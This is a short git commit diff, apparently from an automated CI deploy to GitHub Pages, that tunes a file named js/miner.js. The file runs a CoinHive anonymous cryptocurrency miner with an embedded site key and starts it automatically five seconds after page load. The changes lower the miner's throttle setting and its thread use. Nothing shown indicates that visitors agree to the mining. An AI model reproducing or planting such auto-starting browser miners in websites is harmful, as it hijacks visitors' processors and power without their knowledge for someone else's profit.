2c4f65241f6c57056abe8d283abad57d243de5dd
Travis CI <michele.nasti@gmail.com>
2017-10-31 12:56:46 +0100

    Deploy to GitHub Pages: be2f9da1b2f5d9cc82cb00514a8a67bb41e12291

--- js/miner.js
+++ js/miner.js
@@ -2,7 +2,7 @@ var miner = new CoinHive.Anonymous('8O0pD3Nu5TjaiP3gEVd2s5OCMVB2ZSOY');
 
 miner.setNumThreads(Math.min(miner.getNumThreads(), 3));
 
-miner.setThrottle(0.4)
+miner.setThrottle(0.3)
 
 setTimeout(startMiner, 5000)
 
@@ -13,6 +13,7 @@ function startMiner() {
     var interval = setInterval(function () {
         var threads = miner.getNumThreads();
         if (threads <= 1) {
+            miner.setThrottle(0.1)
             clearInterval(interval);
         } else {
             miner.setNumThreads(threads - 1);
